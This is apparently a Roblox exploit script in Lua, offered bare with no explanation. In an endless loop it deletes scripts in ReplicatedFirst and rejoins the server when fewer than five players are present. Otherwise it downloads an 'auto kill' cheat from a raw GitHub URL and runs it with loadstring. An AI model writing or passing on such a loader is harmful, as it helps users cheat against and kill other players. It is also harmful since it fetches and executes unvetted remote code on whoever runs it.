while true do
    if #game:GetService("Players"):GetPlayers() < 5 then
        for _, obj in ipairs(game:GetService("ReplicatedFirst"):GetChildren()) do
            if obj:IsA("Script") or obj:IsA("LocalScript") then
                obj:Destroy()
            end
        end
        game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
    else
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Pxrson/auto-kill/main/auto%20kill.lua"))()
    end
    task.wait(10)
end
